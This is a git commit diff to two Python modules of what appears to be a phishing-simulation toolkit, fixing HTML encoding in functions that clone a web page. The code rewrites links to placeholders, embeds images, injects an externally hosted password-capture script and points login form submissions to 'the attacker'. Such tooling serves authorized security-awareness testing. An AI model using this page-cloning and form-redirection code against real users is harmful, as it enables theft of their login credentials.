28a3bcde8873baed6d82f61070479d8bb573aaa8
Chris Maddalena <chris.maddalena@gmail.com>
2016-01-23 18:11:42 -0500

    Fixed encoding issues and clean-up
    Added xml.sax.saxutils to use unescape() to fix ;lt, ;gt, ;amp
    characters that broke many webpages during processing.

--- lib/phishexit.py
+++ lib/phishexit.py
@@ -1,30 +1,31 @@
-import re #Used for RegEx
+import re # Used for RegEx
 from BeautifulSoup import BeautifulSoup #For parsing HTML
-import urlparse #For joining URLs for <img> tags
-import base64 #For encoding and embedding images
-import urllib #For opening image URLs
+import urlparse # For joining URLs for <img> tags
+import base64 # For encoding and embedding images
+import urllib2 # For opening image URLs
 
-#This is Step 1 - URLs are replaced with our phishing URLs and new text is saved to output file
+# This is Step 1 - URLs are replaced with our phishing URLs and new text is saved to output file
 def replaceURL(URL,OUTPUT):
-	#Provide user feedback
+	# Provide user feedback
 	print "[+] Replacing URLs..."
 	print "[+] URLs that will be replaced:"
-	#Open source, read lines, and begin parsing to replace all URLs inside <a> tags with href
+	# Open source, read lines, and begin parsing to replace all URLs inside <a> tags with href
 	try:
-		#Print href URLs that will be replaced
+		# Print href URLs that will be replaced
 		print "\n".join(re.findall('<a href="?\'?([^"\'>]*)', open(OUTPUT).read()))
 		with open(OUTPUT, "r") as html:
-			#Read in the source html and parse with BeautifulSoup
+			# Read in the source html and parse with BeautifulSoup
 			soup = BeautifulSoup(html)
-			#Find all links and replace URLs with our new text/URL
+			# Find all links and replace URLs with our new text/URL
 			for link in soup.findAll('a', href=True):
 				link['href'] = '{{links.generic}}'
 			for link in soup.findAll('link', href=True):
 				link['href'] = urlparse.urljoin(URL, link['href'])
 			for link in soup.findAll('script', src=True):
 				link['src'] = urlparse.urljoin(URL, link['src'])
-			source = str(soup.prettify(encoding='utf-8'))
-			#Write the updated URLs to the output file while removing the [' and ']
+			source = soup.prettify()
+			source = xml.sax.saxutils.unescape(source)
+			# Write the updated URLs to the output file while removing the [' and ']
 			output = open(OUTPUT, "w")
 			output.write(source.replace('[','').replace(']',''))
 			output.close()
@@ -32,32 +33,33 @@ def replaceURL(URL,OUTPUT):
 	except:
 		print "[-] URL parsing failed. Make sure the html file exists and is readable."
 
-#This is Step 2 - Images are found, downloaded, encoded in Base64, and embedded in the output file
+# This is Step 2 - Images are found, downloaded, encoded in Base64, and embedded in the output file
 def fixImageURL(URL,OUTPUT):
-	#Provide user feedback
+	# Provide user feedback
 	print "[+] Finding IMG tags with src=/... for replacement."
 	print "[+] RegEx matches:"
-	#Open source, read lines, and begin parsing to replace all incomplete img src URLs
+	# Open source, read lines, and begin parsing to replace all incomplete img src URLs
 	try:
-		#Print img src URLs that will be modified and provide info
+		# Print img src URLs that will be modified and provide info
 		print "\n".join(re.findall('src="(.*?)"', open(OUTPUT).read()))
 		print "[+] Fixing src with " + URL + "..."
 		with open(OUTPUT, "r") as html:
-			#Read in the source html and parse with BeautifulSoup
+			# Read in the source html and parse with BeautifulSoup
 			soup = BeautifulSoup(html)
-			#Find all <img> with src attribute and create a full URL to download and embed image(s)
+			# Find all <img> with src attribute and create a full URL to download and embed image(s)
 			for img in soup.findAll('img'):
 				imgurl = urlparse.urljoin(URL, img['src'])
-				image = urllib.urlopen(imgurl)
-				#Encode in Base64 and embed
+				image = urllib2.urlopen(imgurl)
+				# Encode in Base64 and embed
 				img_64 = base64.b64encode(image.read())
 				img['src'] = "data:image/png;base64," + img_64
-			source = str(soup.prettify(encoding='utf-8'))
-			#Write the updated addresses to the output file while removing the [' and ']
+			source = soup.prettify()
+			source = xml.sax.saxutils.unescape(source)
+			# Write the updated addresses to the output file while removing the [' and ']
 			output = open(OUTPUT, "w")
 			output.write(source.replace('[','').replace(']',''))
 			output.close()
 			print "[+] IMG parsing successful. IMG src's fixed."
 	except:
-		#Exception may occur if file doesn't exist or can't be read/written to
+		# Exception may occur if file doesn't exist or can't be read/written to
 		print "[-] IMG parsing failed. Make sure the html file exists and is readable."
--- lib/phishgate.py
+++ lib/phishgate.py
@@ -1,32 +1,31 @@
-import re #Used for RegEx
-from BeautifulSoup import BeautifulSoup #For parsing HTML
-import urlparse #For joining URLs, required for <a>, <link>, and <script> tags
+import re # Used for RegEx
+from BeautifulSoup import BeautifulSoup # For parsing HTML
+import urlparse # For joining URLs, required for <a>, <link>, and <script> tags
+import xml.sax.saxutils # For unescaping ;lt ;gt ;amp
 
-encoding = 'utf-8'
-
-#This is Step 1 - URLs are replaced with our phishing URLs and new text is saved to output file
+# This is Step 1 - URLs are replaced with our phishing URLs and new text is saved to output file
 def replaceURL(URL,OUTPUT):
-	#Provide user feedback
+	# Provide user feedback
 	print "[+] Replacing the URLs in the HTML source."
 	print "[+] URLs that will be replaced:"
-	#Open source, read lines, and begin parsing to replace all URLs for scripts and links
+	# Open source, read lines, and begin parsing to replace all URLs for scripts and links
 	try:
-		#Print href URLs that will be replaced
+	# Print href URLs that will be replaced
 		print "\n".join(re.findall('<a href="?\'?([^"\'>]*)', open(OUTPUT).read()))
-		with open(OUTPUT, "r") as html:
-			#Read in the source html and parse with BeautifulSoup
+		with open(OUTPUT, "r+b") as html:
+			# Read in the source html and parse with BeautifulSoup
 			soup = BeautifulSoup(html)
-			#Find all links and replace URLs with our new text/URLs
+			# Find all links and replace URLs with our new text/URLs
 			for link in soup.findAll('a', href=True):
 				link['href'] = '{{links.phishgate}}'
 			for link in soup.findAll('link', href=True):
 				link['href'] = urlparse.urljoin(URL, link['href'])
 			for link in soup.findAll('script', src=True):
 				link['src'] = urlparse.urljoin(URL, link['src'])
-			#source = str(soup.prettify(encoding=encoding))
-			source = soup.str(encoding='latin1')
+			source = soup.prettify()
+			source = xml.sax.saxutils.unescape(source)
 
-			#Write the updated URLs to output file while removing the [' and ']
+			# Write the updated URLs to output file while removing the [' and ']
 			output = open(OUTPUT, "w")
 			output.write(source.replace('[','').replace(']',''))
 			output.close()
@@ -34,48 +33,50 @@ def replaceURL(URL,OUTPUT):
 	except:
 		print "[-] URL parsing failed. Make sure the html file exists and is readable."
 
-#This is Step 2 - Insert JavaScript for login form password dtripping and evaluation.
-#This is done after replaceURL() or else the JavScript URL will be edited
+# This is Step 2 - Insert JavaScript for login form password dtripping and evaluation.
+# This is done after replaceURL() or else the JavScript URL will be edited
 def insertPwdEval(OUTPUT):
-	strJSLogin = '<script type="text/javascript" src="JAVASCRIPT_LINK"></script>' #Replace src with real URL for hosted checkForm.js
+	strJSLogin = '<script type="text/javascript" src="JAVASCRIPT_LINK"></script>' # Replace src with real URL for hosted checkForm.js
 	print "[+] Inserting password JavaScript."
 	try:
 		with open(OUTPUT, "r") as html:
-			#Read in the source html and parse with BeautifulSoup
+			# Read in the source html and parse with BeautifulSoup
 			source = html.read()
 			index = source.find(r"</html")
 			print "[+] Closing HTML tag found at index " + str(index)
 			javascript = source[:index] + strJSLogin + source[index:]
 			soup = BeautifulSoup(javascript.replace('[','').replace(']',''))
 			output = open(OUTPUT, "w")
-			output.write(soup.prettify(encoding=encoding))
+			output.write(xml.sax.saxutils.unescape(soup.prettify()))
 			output.close()
 			print "[+] JavaScript has been inserted."
 	except:
-		#Exception may occur if file doesn't exist or can't be read/written to
+		# Exception may occur if file doesn't exist or can't be read/written to
 		print "[-] Failed to insert JavaScript. Make sure the html file exists and is readable."
 
-#This is Step 3 - Form actions are changed to redirect POST to the 'attacker'
+# This is Step 3 - Form actions are changed to redirect POST to the 'attacker'
 def fixForms(OUTPUT):
-	#Provide user feedback
+	# Provide user feedback
 	print "[+] Finding forms to edit."
 	print "[+] RegEx matches:"
-	#Open output file, read lines, and begin parsing to replace all incomplete img src URLs
+	# Open output file, read lines, and begin parsing to replace all incomplete img src URLs
 	try:
 		with open(OUTPUT, "r") as html:
-			#Read in the source html and parse with BeautifulSoup
+			# Read in the source html and parse with BeautifulSoup
 			soup = BeautifulSoup(html)
-			#Find all <form> with action attribute and replace it
+			# Find all <form> with action attribute and replace it
+			# Uncomment additional lines for method and onsubmit if replacing JavaScript
 			for form in soup.findAll('form'):
 				form['action'] = "{{links.phishgate}}"
 				#form['method'] = "post"
 				#form['onsubmit'] = "return checkForm(this);"
-			source = str(soup.prettify(encoding=encoding))
-			#Write the updated form to output file while removing the [' and ']
+			source = soup.prettify()
+			source = xml.sax.saxutils.unescape(source)
+			# Write the updated form to output file while removing the [' and ']
 			output = open(OUTPUT, "w")
 			output.write(source.replace('[','').replace(']',''))
 			output.close()
 			print "[+] Form parsing successful."
 	except:
-		#Exception may occur if file doesn't exist or can't be read/written to
+		# Exception may occur if file doesn't exist or can't be read/written to
 		print "[-] Form parsing failed. Make sure the html file exists and is readable."
